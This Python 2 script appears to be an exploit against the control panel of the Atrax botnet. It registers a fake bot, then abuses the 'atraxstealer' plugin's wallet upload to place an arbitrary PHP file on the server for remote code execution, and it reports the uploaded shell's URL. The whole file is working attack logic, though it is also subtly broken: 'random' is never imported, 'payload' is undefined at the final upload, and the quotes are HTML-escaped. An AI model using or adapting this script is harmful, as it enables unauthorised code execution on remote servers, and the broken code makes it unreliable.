import string
import base64
import urllib
import urllib2

# <CONFIG>
url     = &#039;http://localhost/atrax/&#039;
# </CONFIG>

BOT_MODE_INSERT             = &#039;b&#039; # BOT MODE
BOT_MODE_RUNPLUGIN          = &#039;e&#039;
GET_PARAM_MODE              = &#039;a&#039; # GET PARAM
POST_PARAM_GUID             = &#039;h&#039; # POST PARAM
POST_PARAM_IP               = &#039;i&#039;
POST_PARAM_BUILDID          = &#039;j&#039;
POST_PARAM_PC               = &#039;k&#039;
POST_PARAM_OS               = &#039;l&#039;
POST_PARAM_ADMIN            = &#039;m&#039;
POST_PARAM_CPU              = &#039;n&#039;
POST_PARAM_GPU              = &#039;o&#039;
POST_PARAM_PLUGINNAME       = &#039;q&#039;

def request(url, get, post):
	if not get == &#039;&#039;:
		url += &#039;?&#039; + get
	encoded = {}
	if not post == &#039;&#039;:
		for _ in post.split(&#039;&&#039;):
			data             = _.split(&#039;=&#039;)
			encoded[data[0]] = data[1]
	encoded  = urllib.urlencode(encoded)
	request  = urllib2.Request(url, encoded)
	response = urllib2.urlopen(request)
	page     = response.read()
	return page

def queryValue(key, value, next=True):
	ret = key + &#039;=&#039; + value
	if next:
		ret += &#039;&&#039;
	return ret

def randomString(length = 8):
	return &#039;&#039;.join(random.choice(string.ascii_lowercase + string.digits) for i in range(length))

def createVictim(url, guid, ip):
	get   = queryValue(GET_PARAM_MODE,     BOT_MODE_INSERT, False)
	post  = queryValue(POST_PARAM_GUID,    guid)
	post += queryValue(POST_PARAM_IP,      ip)
	post += queryValue(POST_PARAM_BUILDID, randomString())
	post += queryValue(POST_PARAM_PC,      randomString())
	post += queryValue(POST_PARAM_OS,      randomString())
	post += queryValue(POST_PARAM_ADMIN,   &#039;yes&#039;)
	post += queryValue(POST_PARAM_CPU,     randomString())
	post += queryValue(POST_PARAM_GPU,     randomString(), False)
	return request(url + &#039;auth.php&#039;, get, post)

def exploit(url, guid, ip, file, payload):
	get   = queryValue(GET_PARAM_MODE,        BOT_MODE_RUNPLUGIN, False)
	post  = queryValue(POST_PARAM_PLUGINNAME, &#039;atraxstealer&#039;)
	post += queryValue(POST_PARAM_GUID,       guid)
	post += queryValue(POST_PARAM_IP,         ip)
	post += queryValue(&#039;am&#039;,                  randomString())
	post += queryValue(&#039;ad&#039;,                  file)
	post += queryValue(&#039;ab&#039;,                  base64.b64encode(payload))
	post += queryValue(&#039;ai&#039;,                  &#039;18&#039;, False)
	request(url + &#039;auth.php&#039;, get, post)

def testExploit(url, guid, ip):
	file    = randomString() + &#039;.php&#039;
	payload = &#039;<?php echo("1337"); ?>&#039;
	exploit(url, guid, ip, file, payload)
	return request(url + &#039;plugins/atraxstealer/wallet/&#039; + file, &#039;&#039;, &#039;&#039;).strip() == &#039;1337&#039;
	
guid    = &#039;7461707a7461707a7461707a7461707a&#039;
ip      = &#039;91.224.13.103&#039;
file    = randomString() + &#039;.php&#039;
if createVictim(url, guid, ip).strip() == &#039;STOP&#039;:
	print &#039;[-] Cannot create victim...&#039;
else:
	print &#039;[~] Victim created/updated...&#039;
	if testExploit(url, guid, ip):
		exploit(url, guid, ip, file, payload)
		print &#039;[+] Exploit uploaded!&#039;
		print &#039;=> &#039; + url + &#039;plugins/atraxstealer/wallet/&#039; + file
	else:
		print &#039;[-] Cannot upload payload, maybe the plugin is not actived?&#039;

